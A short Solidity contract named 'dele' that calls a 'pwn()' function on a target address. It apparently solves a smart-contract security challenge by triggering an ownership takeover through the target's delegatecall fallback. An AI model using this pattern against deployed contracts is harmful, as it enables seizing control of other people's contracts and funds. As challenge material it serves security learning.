// SPDX-License-Identifier: MIT
pragma solidity ^0.8.3;

interface IntPwn {
    function pwn() external;
}

contract dele {
    IntPwn public pwn;

    constructor(address _target) {
        pwn = IntPwn(_target);
    }

    function callPwn() public {
        pwn.pwn();
    }
}
